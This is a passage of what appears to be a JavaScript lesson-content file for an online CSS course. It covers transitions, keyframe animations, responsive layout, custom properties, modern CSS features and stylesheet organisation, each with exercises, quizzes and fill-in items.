      code: 'outline: 2px solid;\noutline-___: 2px;', opts: ["gap", "offset", "margin", "spacing"], correct: 1,
      why: "outline-offset moves it out without affecting layout." }
  ]
};

LESSON_CONTENT_2["css:12"] = {
  blocks: [
    ['p', "A transition animates the gap between two states. You change a value — usually on hover, focus or a toggled class — and the browser fills in the frames."],
    ['code', 'css', `.cta {
  background: #0E7C70;
  transition: background 150ms ease, transform 150ms ease;
}
.cta:hover { background: #0A5A51; }
.cta:active { transform: translateY(1px); }`],
    ['warn', "Put the `transition` on the **base** rule, not inside `:hover`. On `:hover` only it animates on the way in and snaps back on the way out."],
    ['h', "The four parts"],
    ['code', 'css', `transition: <property> <duration> <easing> <delay>;
transition: opacity 200ms ease-out 50ms;
transition: all 200ms ease;          /* convenient, and wasteful */`],
    ['p', "`all` makes the browser watch every property, including ones you never intended to animate. Naming them is faster and avoids surprises."],
    ['h', "Only some properties are cheap"],
    ['tbl',
      ["Property", "Cost", "Why"],
      [
        ["`transform`", "**cheap**", "handled by the compositor, no layout"],
        ["`opacity`", "**cheap**", "same"],
        ["`background-color`, `color`", "moderate", "repaint, no layout"],
        ["`width`, `height`, `top`, `margin`", "**expensive**", "forces layout on every frame"]
      ]
    ],
    ['code', 'css', `.card { transition: top 200ms; }        /* janky */
.card { transition: transform 200ms; }  /* smooth */
.card:hover { transform: translateY(-4px); }`],
    ['h', "Easing"],
    ['tbl',
      ["Curve", "Feels like", "Use for"],
      [
        ["`linear`", "mechanical", "spinners, progress"],
        ["`ease-out`", "arrives gently", "**most UI** — things entering"],
        ["`ease-in`", "leaves gently", "things exiting"],
        ["`cubic-bezier(.2,.8,.2,1)`", "confident, slightly springy", "buttons, cards"]
      ]
    ],
    ['p', "`ease-out` is the default choice: it starts fast and settles, which reads as responsive. `ease-in` on something appearing feels sluggish."],
    ['lab', 'css', `.cta {
  background: #0E7C70; color: white; border: 0;
  padding: .6rem 1.4rem; border-radius: 6px;
  transition: transform 180ms cubic-bezier(.2,.8,.2,1),
              box-shadow 180ms ease-out;
  box-shadow: 0 1px 2px #14201E22;
}
.cta:hover { transform: translateY(-2px); box-shadow: 0 6px 14px #14201E33; }
.cta:active { transform: translateY(0); }

.card { transition: border-color 200ms ease; border: 2px solid #D2D9D6; padding: 1rem; }
.card:hover { border-color: #0E7C70; }`],
    ['h', "What cannot transition"],
    ['p', "`display` is not animatable — going to `display: none` snaps. Animate `opacity` and `visibility` together instead:"],
    ['code', 'css', `.panel {
  opacity: 0; visibility: hidden;
  transition: opacity 200ms ease, visibility 0s 200ms;
}
.panel.open {
  opacity: 1; visibility: visible;
  transition: opacity 200ms ease, visibility 0s;
}`],
    ['p', "The `0s` delay on `visibility` holds it visible until the fade finishes, then flips it — otherwise it vanishes instantly and you see no fade at all."],
    ['h', "Respecting the setting"],
    ['code', 'css', `@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    transition-duration: .01ms !important;
    animation-duration: .01ms !important;
  }
}`],
    ['p', "Some people get motion sickness from interface animation. This is two lines and it is not optional."]
  ],
  ex: [
    { q: "Add a hover transition to a button. Why does it belong on the base rule?",
      a: "The transition describes how the element animates in general. On `:hover` alone the rule stops applying the moment the pointer leaves, so it eases in and snaps back." },
    { q: "Replace a `top` transition with `transform`. Why is it smoother?",
      a: "`top` forces the browser to recalculate layout every frame; `transform` is handled by the compositor with no layout or paint. On a long list the difference is the gap between 60fps and visible stutter." },
    { q: "Which easing for a menu appearing, and which for it leaving?",
      a: "`ease-out` on the way in — fast then settling, which reads as responsive. `ease-in` on the way out, so it accelerates away. Using `ease-in` for entrances is what makes an interface feel slow." },
    { q: "Fade a panel out and then remove it from the layout.",
      hint: "`display` cannot transition.",
      a: "The `0s` delay on `visibility` keeps it visible for the duration of the fade, then switches. Without it the element disappears immediately and no fade is seen.",
      code: ['css', `.panel { opacity: 0; visibility: hidden; transition: opacity 200ms, visibility 0s 200ms; }
.panel.open { opacity: 1; visibility: visible; transition: opacity 200ms, visibility 0s; }`] },
    { q: "Add the reduced-motion block and explain who it is for.",
      a: "People with vestibular disorders, for whom interface motion causes genuine nausea and dizziness. The OS setting is how they ask; honouring it costs two lines." }
  ],
  quiz: [
    { q: "Where does the `transition` declaration belong?",
      opts: ["In :hover", "On the base rule", "Either", "In @media"], correct: 1,
      why: "On :hover only, it animates in and snaps back out." },
    { q: "Which pair is cheapest to animate?",
      opts: ["width and height", "top and left", "transform and opacity", "margin and padding"], correct: 2,
      why: "They run on the compositor without triggering layout." },
    { q: "Which easing suits something appearing?",
      opts: ["ease-in", "ease-out", "linear", "steps()"], correct: 1,
      why: "Fast then settling reads as responsive; ease-in on an entrance feels sluggish." },
    { q: "Why can't you transition `display: none`?",
      opts: ["It is too fast", "display is not animatable — it snaps", "It needs a delay", "You can"], correct: 1,
      why: "Animate opacity, and switch visibility after a delay matching the duration." }
  ],
  fill: [
    { prompt: "Animate only what you meant to.", lang: 'css',
      code: 'transition: ___ 150ms ease;', opts: ["all", "transform", "*", "any"], correct: 1,
      why: "`all` makes the browser watch every property, including ones you never intended." },
    { prompt: "Move an element without triggering layout.", lang: 'css',
      code: '.card:hover { ___: translateY(-4px); }', opts: ["top", "margin-top", "transform", "position"], correct: 2,
      why: "transform is composited; top forces layout every frame." },
    { prompt: "Turn motion off for those who ask.", lang: 'css',
      code: '@media (prefers-___-motion: reduce) { }', opts: ["no", "less", "reduced", "min"], correct: 2,
      why: "It exposes the operating system's accessibility setting." }
  ]
};

LESSON_CONTENT_2["css:13"] = {
  blocks: [
    ['p', "A transition needs a trigger. An animation runs on its own, and can have as many steps as you like."],
    ['code', 'css', `@keyframes pulse {
  0%   { transform: scale(1);    opacity: 1; }
  50%  { transform: scale(1.06); opacity: .85; }
  100% { transform: scale(1);    opacity: 1; }
}

.badge { animation: pulse 2s ease-in-out infinite; }`],
    ['h', "The shorthand"],
    ['code', 'css', `animation: <name> <duration> <easing> <delay> <count> <direction> <fill-mode>;

animation: slide-in 300ms ease-out;
animation: spin 1s linear infinite;
animation: fade 400ms ease-out 200ms 1 normal both;`],
    ['tbl',
      ["Property", "Does"],
      [
        ["`animation-iteration-count`", "a number, or `infinite`"],
        ["`animation-direction`", "`normal`, `reverse`, `alternate`"],
        ["`animation-fill-mode`", "what applies outside the run"],
        ["`animation-play-state`", "`running` or `paused`"]
      ]
    ],
    ['h', "fill-mode, or why it snaps back"],
    ['code', 'css', `@keyframes fade-in { from { opacity: 0; } to { opacity: 1; } }

.thing { opacity: 1; animation: fade-in 400ms; }          /* flickers */
.thing { opacity: 1; animation: fade-in 400ms backwards; } /* correct */`],
    ['warn', "Outside its run, an animation applies nothing — the element uses its normal styles. `backwards` applies the first frame during the delay; `forwards` keeps the last frame afterwards; `both` does both. Missing this is why elements jump at the start or snap back at the end."],
    ['lab', 'css', `@keyframes rise {
  from { opacity: 0; transform: translateY(12px); }
  to   { opacity: 1; transform: none; }
}
@keyframes pulse {
  0%,100% { transform: scale(1); }
  50%     { transform: scale(1.08); }
}

.card { animation: rise 500ms cubic-bezier(.2,.8,.2,1) backwards; }
h2    { animation: rise 500ms ease-out 120ms backwards; }
.cta  { animation: pulse 1.8s ease-in-out infinite; }`],
    ['h', "Staggering"],
    ['code', 'css', `.item { animation: rise 400ms ease-out backwards; }
.item:nth-child(1) { animation-delay: 0ms; }
.item:nth-child(2) { animation-delay: 60ms; }
.item:nth-child(3) { animation-delay: 120ms; }

/* or, driven by a variable set in JavaScript */
.item { animation-delay: calc(var(--i) * 60ms); }`],
    ['p', "A stagger is what makes a list feel like it arrived rather than appeared. This course's own dashboard uses exactly that `calc(var(--i) * ...)` pattern."],
    ['h', "A loading spinner"],
    ['code', 'css', `@keyframes spin { to { transform: rotate(360deg); } }

.spinner {
  width: 1.5rem; height: 1.5rem;
  border: 3px solid #D2D9D6;
  border-top-color: #0E7C70;
  border-radius: 50%;
  animation: spin 700ms linear infinite;
}`],
    ['p', "One keyframe is enough — with only a `to`, the browser uses the element's current state as the start."],
    ['h', "Keeping it at 60fps"],
    ['ul', [
      "Animate `transform` and `opacity` only. Everything else risks layout work per frame.",
      "Do not animate `width`, `height`, `top` or `margin` in a loop.",
      "`will-change: transform` can help, but overusing it wastes memory — add it only when you measure a problem.",
      "Always include the `prefers-reduced-motion` block."
    ]]
  ],
  ex: [
    { q: "Write a `pulse` keyframe scaling to 1.08 and back, and run it forever.",
      a: "Using `0%, 100%` for the same frame avoids repeating the declaration.",
      code: ['css', `@keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
.badge { animation: pulse 1.8s ease-in-out infinite; }`] },
    { q: "A `fade-in` animation flickers at full opacity before starting. Why, and what fixes it?",
      a: "Before the animation begins the element uses its normal styles, so it is briefly fully visible. `animation-fill-mode: backwards` applies the first keyframe during that period." },
    { q: "Stagger five list items by 60ms each, without writing five rules.",
      hint: "A custom property plus `calc`.",
      a: "Set `--i` on each element — from `nth-child` or from JavaScript — and compute the delay once.",
      code: ['css', `.item { animation: rise 400ms ease-out backwards; animation-delay: calc(var(--i) * 60ms); }`] },
    { q: "Build a spinner using a single keyframe. Why is one enough?",
      a: "With only a `to`, the browser takes the element's current computed style as the implicit `from` — so `to { transform: rotate(360deg) }` spins from wherever it is.",
      code: ['css', `@keyframes spin { to { transform: rotate(360deg); } }`] },
    { q: "Why animate `transform: translateX` rather than `left`?",
      a: "`left` forces layout recalculation on every frame, and layout is the expensive part of rendering. `transform` runs on the compositor, so the animation can hold 60fps even while the main thread is busy." }
  ],
  quiz: [
    { q: "What does `animation-fill-mode: forwards` do?",
      opts: ["Plays forwards", "Keeps the last keyframe applied after it finishes", "Repeats", "Reverses"], correct: 1,
      why: "Without it the element snaps back to its normal styles when the animation ends." },
    { q: "Why does a fade-in flicker at the start?",
      opts: ["Wrong easing", "Before it runs the element uses its normal styles — use backwards", "Duration too short", "Missing keyframes"], correct: 1,
      why: "fill-mode controls what applies outside the animation's run." },
    { q: "Which is safe to animate at 60fps?",
      opts: ["width", "top", "transform", "margin"], correct: 2,
      why: "transform and opacity are composited; the others force layout." },
    { q: "A keyframe block with only `to` — what is the starting state?",
      opts: ["Zero", "The element's current computed style", "Invalid", "The first rule in the file"], correct: 1,
      why: "Which is why a one-line spin keyframe works." }
  ],
  fill: [
    { prompt: "Define a named animation.", lang: 'css',
      code: '___ spin { to { transform: rotate(360deg); } }', opts: ["@animation", "@keyframes", "@motion", "@frames"], correct: 1,
      why: "Then reference the name in the animation property." },
    { prompt: "Stop it snapping back at the end.", lang: 'css',
      code: 'animation: fade 400ms ease-out ___;', opts: ["infinite", "forwards", "reverse", "paused"], correct: 1,
      why: "forwards keeps the last keyframe applied." },
    { prompt: "Stagger items from a variable.", lang: 'css',
      code: 'animation-delay: ___(var(--i) * 60ms);', opts: ["calc", "min", "clamp", "var"], correct: 0,
      why: "calc does arithmetic mixing custom properties and units." }
  ]
};

LESSON_CONTENT_2["css:14"] = {
  blocks: [
    ['p', "A page should work from a 320px phone to a wide monitor. Modern CSS does most of it without a single breakpoint."],
    ['h', "The viewport tag comes first"],
    ['code', 'html', `<meta name="viewport" content="width=device-width, initial-scale=1">`],
    ['warn', "Without this a phone pretends to be 980px wide and scales the whole page down, so your media queries never fire and the text is unreadable. It goes in `<head>` on every page — nothing else in this lesson works without it."],
    ['h', "Mobile first"],
    ['code', 'css', `/* the base: narrow screens, no query needed */
.layout { display: grid; gap: 1rem; }

/* add complexity as space allows */
@media (min-width: 40rem) {
  .layout { grid-template-columns: 16rem 1fr; }
}
@media (min-width: 64rem) {
  .layout { grid-template-columns: 16rem 1fr 18rem; }
}`],
    ['p', "Write `min-width` queries that add, rather than `max-width` queries that undo. The base case is then the simplest one, which is also what an old or unusual browser gets."],
    ['h', "Choose breakpoints from the content"],
    ['p', "Not from device names — those change every year, and no page ever looked wrong at exactly 768px for a reason connected to a device. Widen the window slowly and stop where the layout starts to look bad. That is your breakpoint."],
    ['h', "Most of it needs no query at all"],
    ['code', 'css', `/* columns that reflow by themselves */
grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));

/* type that scales between bounds */
font-size: clamp(1.5rem, 1rem + 2vw, 3rem);

/* never wider than the screen */
img { max-width: 100%; height: auto; }

/* a sidebar that drops below when there is no room */
.layout { display: flex; flex-wrap: wrap; gap: 2rem; }
.sidebar { flex: 1 1 16rem; }
.main    { flex: 3 1 24rem; }`],
    ['lab', 'css', `.card {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(7rem, 1fr));
  gap: .75rem;
  padding: 1rem;
  border: 2px solid #D2D9D6;
}
h2 {
  grid-column: 1 / -1;
  font-size: clamp(1.1rem, .9rem + 1.5vw, 1.8rem);
  margin: 0;
}
/* Drag the divider between the editor and this preview to resize. */`],
    ['h', "Other things worth querying"],
    ['code', 'css', `@media (prefers-color-scheme: dark) { }
@media (prefers-reduced-motion: reduce) { }
@media (hover: none) { }          /* touch: no hover states */
@media print { }`],
    ['note', "`@media (hover: none)` is the honest way to handle touch. A hover-only menu is unreachable on a phone, and screen width is a poor proxy for whether a pointer exists."],
    ['h', "Testing"],
    ['ul', [
      "Devtools device toolbar (Ctrl+Shift+M) — quick, and enough most of the time.",
      "Drag the window narrow. If it breaks between two breakpoints you need a third.",
      "Try 320px — still the practical floor.",
      "Zoom to 200%. It is a different failure mode from a narrow window and often overlooked."
    ]]
  ],
  ex: [
    { q: "What happens on a phone without the viewport meta tag?",
      a: "The browser assumes a 980px-wide page and scales it down to fit, so everything is tiny and `min-width` queries never match. Adding one line fixes an entire page." },
    { q: "Rewrite a `max-width: 768px` query as mobile-first.",
      a: "Invert it: make the narrow layout the base rule and use `min-width` to add the wider one. The base case is then the simplest, and nothing needs undoing.",
      code: ['css', `.layout { display: grid; gap: 1rem; }
@media (min-width: 48rem) { .layout { grid-template-columns: 16rem 1fr; } }`] },
    { q: "Build a card grid and a fluid heading with no media queries at all.",
      a: "`auto-fit` + `minmax` handles the columns; `clamp` handles the type. Between them they cover most of what breakpoints used to be needed for.",
      code: ['css', `grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));
h2 { font-size: clamp(1.2rem, 1rem + 1.5vw, 2rem); }`] },
    { q: "Why choose breakpoints from the content rather than from device widths?",
      a: "Device sizes change constantly and any list you pick is out of date within a year. Content has one honest breakpoint: the width at which it stops looking right. Widen the window until that happens and put the query there." },
    { q: "Why is `@media (hover: none)` better than assuming touch from a narrow width?",
      a: "It asks the real question. A tablet can be wide and touch-only; a laptop can be narrow with a mouse. Width tells you nothing about whether hover exists, and a hover-only menu is simply unreachable without one." }
  ],
  quiz: [
    { q: "What does the viewport meta tag do?",
      opts: ["Sets the page width", "Stops phones pretending to be 980px and scaling the page down", "Enables media queries generally", "Sets the zoom limit"], correct: 1,
      why: "Without it your media queries never fire on a phone." },
    { q: "Why prefer min-width queries?",
      opts: ["Better support", "The base case stays the simplest, and you add rather than undo", "They are faster", "max-width is deprecated"], correct: 1,
      why: "Mobile-first: complexity is added as space allows." },
    { q: "Which needs no media query to reflow?",
      opts: ["float: left", "repeat(auto-fit, minmax(14rem, 1fr))", "width: 33%", "position: absolute"], correct: 1,
      why: "The column count follows the container, not the viewport." },
    { q: "How should you choose breakpoints?",
      opts: ["Common device widths", "Where your content starts to look wrong", "Every 200px", "Only 768px"], correct: 1,
      why: "Device lists go stale; content does not." }
  ],
  fill: [
    { prompt: "Make phones report their real width.", lang: 'html',
      code: '<meta name="___" content="width=device-width, initial-scale=1">', opts: ["screen", "viewport", "display", "layout"], correct: 1,
      why: "Without it a phone pretends to be 980px and scales everything down." },
    { prompt: "Add a wider layout, mobile-first.", lang: 'css',
      code: '@media (___-width: 48rem) { }', opts: ["max", "min", "device", "only"], correct: 1,
      why: "min-width adds as space allows; max-width undoes." },
    { prompt: "Scale type between a floor and a ceiling.", lang: 'css',
      code: 'font-size: ___(1.2rem, 1rem + 2vw, 2rem);', opts: ["minmax", "clamp", "range", "calc"], correct: 1,
      why: "One declaration replacing several breakpoints." }
  ]
};

LESSON_CONTENT_2["css:15"] = {
  blocks: [
    ['p', "Custom properties are real variables that live in the browser — they cascade, they inherit, and JavaScript can change them at runtime. That last point is what makes them different from a preprocessor variable."],
    ['code', 'css', `:root {
  --accent: #0E7C70;
  --ink: #14201E;
  --space: 1rem;
}

.cta { background: var(--accent); padding: var(--space); }`],
    ['h', "They inherit"],
    ['code', 'css', `.card { --accent: #A96A22; }        /* only inside .card */
.card .cta { background: var(--accent); }   /* the orange one */`],
    ['p', "A property set on an element applies to it and everything inside it. That is how one component can be re-themed without touching its own rules — set the variable on a wrapper and everything within follows."],
    ['note', "This is the real difference from Sass. A Sass variable is substituted at build time and then gone. A custom property is live in the browser: it cascades, it can be overridden per element, and it can be changed after the page has loaded."],
    ['h', "Fallbacks"],
    ['code', 'css', `color: var(--accent, #0E7C70);          /* if undefined */
padding: var(--space, var(--gap, 1rem));  /* nested */`],
    ['h', "Theming in one place"],
    ['code', 'css', `:root {
  --bg: #EDF0EE;
  --ink: #14201E;
  --accent: #0E7C70;
}

@media (prefers-color-scheme: dark) {
  :root {
    --bg: #0E1614;
    --ink: #E4EBE8;
    --accent: #45C4B2;
  }
}

:root[data-theme="dark"] { --bg: #0E1614; --ink: #E4EBE8; --accent: #45C4B2; }
:root[data-theme="light"] { --bg: #EDF0EE; --ink: #14201E; --accent: #0E7C70; }

body { background: var(--bg); color: var(--ink); }`],
    ['p', "Every component reads the tokens, so the entire theme is these three blocks. Nothing else in the stylesheet mentions a colour — which is exactly how this course's own page is built."],
    ['lab', 'css', `.card {
  --accent: #0E7C70;          /* change this one value */
  --pad: 1rem;

  border: 2px solid var(--accent);
  border-radius: 8px;
  padding: var(--pad);
}
h2 { color: var(--accent); margin-top: 0; }
.cta {
  background: var(--accent); color: white;
  border: 0; padding: calc(var(--pad) / 2) var(--pad);
  border-radius: 4px;
}`],
    ['h', "JavaScript can read and write them"],
    ['code', 'js', `const root = document.documentElement;
getComputedStyle(root).getPropertyValue("--accent").trim();
root.style.setProperty("--accent", "#A96A22");

card.style.setProperty("--i", index);      // then use it in calc()`],
    ['p', "Setting one variable can restyle a whole page, with no class juggling. The staggered animations in the previous lesson work this way."],
    ['h', "Where they cannot go"],
    ['code', 'css', `--size: 20;
width: var(--size)px;          /* does NOT work */
width: calc(var(--size) * 1px); /* works */

@media (min-width: var(--bp)) { }   /* not allowed in a media query */`],
    ['p', "A custom property is substituted as a token, not textually pasted, so a unit cannot be appended afterwards. Store the unit in the value, or multiply in `calc`."],
    ['h', "A token set worth copying"],
    ['code', 'css', `:root {
  --space-1: .25rem; --space-2: .5rem; --space-3: 1rem;
  --space-4: 1.5rem; --space-5: 2rem;

  --radius: 6px;
  --line: #D2D9D6;
  --shadow: 0 1px 2px #14201E0d, 0 6px 16px #14201E14;
}`]
  ],
  ex: [
    { q: "Define three tokens on `:root` and use them in two rules.",
      a: "Once the values live in one place, changing the accent is one edit rather than a search across the file." },
    { q: "Re-theme a single card by setting `--accent` on it. Why does that work?",
      a: "Custom properties inherit, so a value set on `.card` applies to every descendant. The card's own rules are untouched — they just resolve `var(--accent)` differently inside that subtree.",
      code: ['css', `.card--warning { --accent: #A96A22; }`] },
    { q: "Give the concrete difference between a Sass variable and a custom property.",
      a: "Sass substitutes at build time and disappears; nothing can change it afterwards. A custom property exists in the browser, cascades and inherits, can be overridden per element, and can be rewritten by JavaScript at runtime — which is what makes live theming possible." },
    { q: "Why does `width: var(--size)px` fail? Give the fix.",
      a: "The value is substituted as a token, not pasted as text, so the trailing `px` never joins it. Use `calc(var(--size) * 1px)`, or store the unit in the variable." },
    { q: "Build a light/dark theme using tokens plus `prefers-color-scheme`, and let a button override it.",
      a: "The media query provides the default from the OS; the `data-theme` attribute wins over it because it is a more specific selector on the same element, so a manual toggle overrides the system in both directions.",
      code: ['css', `:root { --bg: #EDF0EE; --ink: #14201E; }
@media (prefers-color-scheme: dark) { :root { --bg: #0E1614; --ink: #E4EBE8; } }
:root[data-theme="dark"]  { --bg: #0E1614; --ink: #E4EBE8; }
:root[data-theme="light"] { --bg: #EDF0EE; --ink: #14201E; }`] }
  ],
  quiz: [
    { q: "What can a custom property do that a Sass variable cannot?",
      opts: ["Hold a colour", "Cascade, inherit, and be changed at runtime", "Be reused", "Have a fallback"], correct: 1,
      why: "Sass is substituted at build time; a custom property is live in the browser." },
    { q: "Setting `--accent` on `.card` affects…",
      opts: ["Only .card", ".card and everything inside it", "The whole page", "Nothing"], correct: 1,
      why: "They inherit, which is what makes component-level theming work." },
    { q: "Why does `width: var(--size)px` fail?",
      opts: ["px is invalid", "The value is a token, not pasted text — nothing joins the px", "var() only holds colours", "It needs quotes"], correct: 1,
      why: "Use calc(var(--size) * 1px), or store the unit in the value." },
    { q: "How does JavaScript change one?",
      opts: ["el.style.accent", "el.style.setProperty('--accent', value)", "el.setAttribute('--accent')", "It cannot"], correct: 1,
      why: "And getComputedStyle().getPropertyValue() reads it back." }
  ],
  fill: [
    { prompt: "Read a token.", lang: 'css',
      code: 'background: ___(--accent);', opts: ["get", "var", "token", "use"], correct: 1,
      why: "var(--name, fallback) also takes a default." },
    { prompt: "Define tokens for the whole document.", lang: 'css',
      code: '___ { --accent: #0E7C70; }', opts: ["body", ":root", "html *", "@theme"], correct: 1,
      why: ":root is the html element, one specificity step above `html`." },
    { prompt: "Use a unitless variable as a length.", lang: 'css',
      code: 'width: ___(var(--size) * 1px);', opts: ["calc", "unit", "px", "num"], correct: 0,
      why: "A unit cannot be appended to a substituted token." }
  ]
};

LESSON_CONTENT_2["css:16"] = {
  blocks: [
    ['p', "CSS has changed more in the last three years than in the decade before. These are the features that remove workarounds you would otherwise still be learning."],
    ['h', ":has() — the parent selector"],
    ['code', 'css', `.card:has(img)          { padding-top: 0; }
.field:has(input:invalid) { border-color: #A96A22; }
label:has(+ input:focus)  { color: #0E7C70; }
.list:not(:has(li))       { display: none; }   /* hide when empty */`],
    ['p', "For twenty years CSS could only look downward. `:has()` styles a parent based on its contents — which removes an enormous amount of JavaScript that existed only to add a class."],
    ['h', "Container queries"],
    ['code', 'css', `.card-area { container-type: inline-size; }

@container (min-width: 30rem) {
  .card { display: grid; grid-template-columns: 8rem 1fr; }
}`],
    ['p', "A media query asks how wide the **window** is. A container query asks how wide the **parent** is — so the same card can be narrow in a sidebar and wide in the main column, on one screen. This is what components always needed."],
    ['h', "Nesting"],
    ['code', 'css', `.card {
  padding: 1rem;

  & h2 { margin-top: 0; }
  &:hover { border-color: var(--accent); }

  @media (min-width: 40rem) { padding: 2rem; }
}`],
    ['warn', "Nesting makes it very easy to write over-specific selectors by accident. Three levels deep produces `.a .b .c`, which then needs `.a .b .c .d` to override. Keep it shallow — the cascade lesson still applies."],
    ['h', "@layer"],
    ['code', 'css', `@layer reset, base, components, utilities;

@layer components { .btn { padding: 1rem; } }
@layer utilities  { .p-0 { padding: 0; } }`],
    ['p', "Layers are compared **before** specificity: anything in `utilities` beats anything in `components`, however specific. It is the principled replacement for `!important` in a design system."],
    ['h', "Everyday additions"],
    ['code', 'css', `aspect-ratio: 16 / 9;                    /* no more padding-top hacks */
inset: 0;                                 /* all four offsets */
gap: 1rem;                                /* now works in flex too */
text-wrap: balance;                       /* even heading lines */
color-mix(in srgb, var(--accent) 20%, white);
accent-color: var(--accent);              /* recolours checkboxes */
scrollbar-gutter: stable;                 /* no jump when scrollbars appear */
:focus-visible { }                        /* keyboard focus only */`],
    ['lab', 'css', `.card:has(.cta) { border-color: #0E7C70; border-width: 3px; }
.card { border: 2px solid #D2D9D6; padding: 1rem; aspect-ratio: auto; }
h2 { text-wrap: balance; margin-top: 0; }
.cta {
  accent-color: #0E7C70;
  background: color-mix(in srgb, #0E7C70 85%, white);
  color: white; border: 0; padding: .5rem 1rem; border-radius: 4px;
}`],
    ['h', "Newer colour spaces"],
    ['code', 'css', `color: oklch(55% 0.12 180);     /* perceptually uniform */`],
    ['p', "In `oklch`, equal lightness numbers look equally light to the eye — unlike `hsl`, where a yellow at 50% looks far brighter than a blue at 50%. It makes generating a palette by varying lightness genuinely reliable."],
    ['h', "Is it safe to use?"],
    ['p', "`:has()`, container queries, nesting, `@layer`, `aspect-ratio` and `color-mix` are all supported across current Chrome, Edge, Firefox and Safari. Check caniuse.com for anything you are unsure about, and remember that an unsupported declaration is simply ignored — so a modern enhancement over a working base degrades quietly."]
  ],
  ex: [
    { q: "Style a card differently when it contains an image, with no JavaScript.",
      a: "Before `:has()` this required a class added by script on load — one of the most common reasons a page needed JavaScript at all.",
      code: ['css', `.card:has(img) { padding-top: 0; }`] },
    { q: "Explain the difference between a media query and a container query with a concrete example.",
      a: "A media query asks the viewport width, so the same card behaves identically in a 20rem sidebar and a 60rem main column. A container query asks the card's own parent, so it can stack in the sidebar and go side-by-side in the main column — on the same screen, at the same time." },
    { q: "Hide a list when it has no items, using only CSS.",
      hint: "Combine `:not` and `:has`.",
      a: "Reads directly as “a list that does not have any list items”.",
      code: ['css', `.list:not(:has(li)) { display: none; }`] },
    { q: "Why is `@layer` a better answer than `!important`?",
      a: "Layers are compared before specificity, so a utility class beats a component rule without needing a higher specificity or `!important` — and without starting the escalation where the only way to win is another `!important`. The ordering is declared once, at the top, and is visible." },
    { q: "Give a risk of CSS nesting and how to avoid it.",
      a: "It makes deep, over-specific selectors effortless — three levels gives `.a .b .c`, which then needs something even more specific to override. Keep nesting to one or two levels and use it mainly for `&:hover` and media queries." }
  ],
  quiz: [
    { q: "What does `:has()` allow that was impossible before?",
      opts: ["Selecting siblings", "Styling a parent based on its contents", "Animating", "Nesting"], correct: 1,
      why: "It removes a great deal of JavaScript whose only job was adding a class." },
    { q: "A container query measures…",
      opts: ["The viewport", "The nearest container ancestor", "The element itself", "The screen"], correct: 1,
      why: "So one component can adapt to a sidebar and a main column on the same screen." },
    { q: "How does @layer interact with specificity?",
      opts: ["It is ignored", "Layer order is compared before specificity", "It adds 1000", "Only with !important"], correct: 1,
      why: "A later layer wins however specific the earlier rule is." },
    { q: "Why is oklch better than hsl for building a palette?",
      opts: ["Shorter", "Equal lightness values look equally light to the eye", "More colours", "Better support"], correct: 1,
      why: "In hsl a 50% yellow looks far brighter than a 50% blue." }
  ],
  fill: [
    { prompt: "Style a card that contains an image.", lang: 'css',
      code: '.card___(img) { padding-top: 0; }', opts: [":is", ":has", ":where", ":not"], correct: 1,
      why: ":has looks at descendants and styles the ancestor." },
    { prompt: "Make an element measurable by container queries.", lang: 'css',
      code: '.area { container-___: inline-size; }', opts: ["query", "type", "size", "name"], correct: 1,
      why: "inline-size means queries can ask about its width." },
    { prompt: "Reserve a 16:9 box without padding hacks.", lang: 'css',
      code: '.video { ___: 16 / 9; }', opts: ["ratio", "aspect-ratio", "proportion", "scale"], correct: 1,
      why: "The height follows from the width automatically." }
  ]
};

LESSON_CONTENT_2["css:17"] = {
  blocks: [
    ['p', "The last lesson. A stylesheet that is pleasant at 200 lines can be unmaintainable at 2,000 — not because CSS is bad, but because nothing forced you to decide where things go."],
    ['h', "The order that works"],
    ['code', 'css', `@layer reset, tokens, base, layout, components, utilities;`],
    ['tbl',
      ["Layer", "Holds"],
      [
        ["**reset**", "box-sizing, margin zeroing, `img { display: block }`"],
        ["**tokens**", "custom properties only — colour, space, type, radius"],
        ["**base**", "bare element styles: `body`, `h1`, `a`, `code`"],
        ["**layout**", "page-level structure: the grid, the shell, the rail"],
        ["**components**", "`.card`, `.btn`, `.badge` — the bulk of the file"],
        ["**utilities**", "single-purpose overrides: `.visually-hidden`, `.mt-0`"]
      ]
    ],
    ['p', "Specificity then largely takes care of itself, because the order encodes what should win."],
    ['h', "Naming"],
    ['code', 'css', `/* BEM: block, element, modifier */
.card { }
.card__title { }
.card--featured { }`],
    ['p', "The value is not the punctuation — it is that every class says which component it belongs to, so nothing collides and searching for `.card` finds everything about cards. Any consistent convention beats an inconsistent good one."],
    ['h', "Keep specificity flat"],
    ['code', 'css', `#main .card > .content h2 span { }   /* unmaintainable */
.card__title { }                     /* one class, easy to override */`],
    ['ul', [
      "Aim for one class per rule.",
      "Never use an ID in a stylesheet — save them for JavaScript hooks and anchors.",
      "Nest at most two levels.",
      "If you reach for `!important`, find the over-specific rule that made you."
    ]],
    ['h', "Splitting files"],
    ['code', 'css', `/* style.css */
@import "reset.css" layer(reset);
@import "tokens.css" layer(tokens);
@import "components/card.css" layer(components);`],
    ['warn', "`@import` costs a round trip per file, because each is discovered only after the previous one is parsed. Fine while developing, slow in production — bundle them, or use one file with clear section banners."],
    ['h', "Documenting a component"],
    ['code', 'css', `/* ──────────────────────────────────────────────
   CARD
   A bordered container for a single item.

   Variants:  .card--featured   accent border
   Requires:  --accent, --radius, --line
   ────────────────────────────────────────────── */
.card { }`],
    ['h', "Where to start on your Flask app"],
    ['code', 'text', `learn/static/css/
  style.css        @layer order + @imports, or one file
  reset.css
  tokens.css       every colour and space value
  base.css         body, headings, links
  components/
    nav.css
    card.css
    form.css`],
    ['h', "The whole track, in seven lines"],
    ['ul', [
      "`box-sizing: border-box` on everything.",
      "Tokens on `:root`; no raw colour anywhere else.",
      "`rem` for type and space, `px` for hairlines, `ch` for measure.",
      "Flexbox for a line of things, grid for a page.",
      "One class per rule; no IDs; no `!important`.",
      "`gap` rather than margins between siblings.",
      "Check contrast, style `:focus-visible`, honour `prefers-reduced-motion`."
    ]],
    ['p', "You now have every piece needed to style the Flask app you have been building. The `static/` folder from lesson 09 is still empty — that is the last exercise."]
  ],
  ex: [
    { q: "List the six layers in order and say what belongs in each.",
      a: "reset, tokens, base, layout, components, utilities. The order is the point: utilities beat components without needing higher specificity, and tokens are available to everything after them." },
    { q: "Rewrite `#main .card > .content h2 span` as something maintainable.",
